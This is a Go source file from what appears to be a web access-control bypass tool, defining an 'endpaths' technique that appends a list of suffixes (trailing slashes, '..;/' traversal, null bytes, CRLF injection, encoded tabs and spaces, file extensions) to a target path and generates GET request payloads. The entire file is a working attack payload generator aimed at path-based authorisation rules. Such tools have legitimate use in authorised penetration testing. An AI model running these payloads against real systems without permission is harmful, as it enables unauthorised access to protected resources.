package bypass

import "fmt"

// EndpathsTechnique appends various path suffixes to the target path
// to bypass path-based access controls (trailing slashes, dots,
// extensions, null bytes, etc.).
type EndpathsTechnique struct{}

// Name returns the technique identifier.
func (t *EndpathsTechnique) Name() string { return "endpaths" }

// Description returns a human-readable summary.
func (t *EndpathsTechnique) Description() string {
	return "Append path suffixes (slashes, dots, extensions, encoded chars) to bypass path rules"
}

// endpathSuffix describes a single suffix and whether it requires raw URL handling.
type endpathSuffix struct {
	value string
	raw   bool // true if the suffix contains percent-encoded chars that must be preserved verbatim
	label string
}

// endpathSuffixes is the master list of suffixes to try.
var endpathSuffixes = []endpathSuffix{
	{"/", false, "trailing slash"},
	{"//", false, "double trailing slash"},
	{"/.", false, "trailing slash-dot"},
	{"/..", false, "trailing slash-dotdot"},
	{".json", false, "json extension"},
	{".html", false, "html extension"},
	{".php", false, "php extension"},
	{".asp", false, "asp extension"},
	{".aspx", false, "aspx extension"},
	{".jsp", false, "jsp extension"},
	{"%20", true, "trailing space (encoded)"},
	{"%09", true, "trailing tab (encoded)"},
	{"%00", true, "null byte"},
	{"%0d%0a", true, "CRLF injection"},
	{";/", false, "semicolon slash"},
	{"?", false, "trailing question mark"},
	{"??", false, "double question mark"},
	{"#", false, "trailing fragment"},
	{"&", false, "trailing ampersand"},
	{"..;/", false, "dotdot-semicolon-slash"},
	{";%09", true, "semicolon tab"},
	{";%00", true, "semicolon null"},
	{".css", false, "css extension"},
	{".js", false, "js extension"},
	{".ico", false, "ico extension"},
	{".txt", false, "txt extension"},
	{"/..;/..;/", false, "double dotdot-semicolon traversal"},
	{"/~", false, "tilde suffix"},
	{"/%20/", true, "encoded space directory"},
}

// Generate produces endpath payloads for the given target.
func (t *EndpathsTechnique) Generate(target *Target) []Payload {
	payloads := make([]Payload, 0, len(endpathSuffixes))
	base := target.BaseURL()
	path := target.Path

	for _, s := range endpathSuffixes {
		fullURL := base + path + s.value
		desc := fmt.Sprintf("endpath: %s (%s)", s.value, s.label)

		if s.raw {
			payloads = append(payloads, makeRawPayload(
				t.Name(), desc, "GET", fullURL, nil,
			))
		} else {
			payloads = append(payloads, makePayload(
				t.Name(), desc, "GET", fullURL, nil,
			))
		}
	}

	return payloads
}
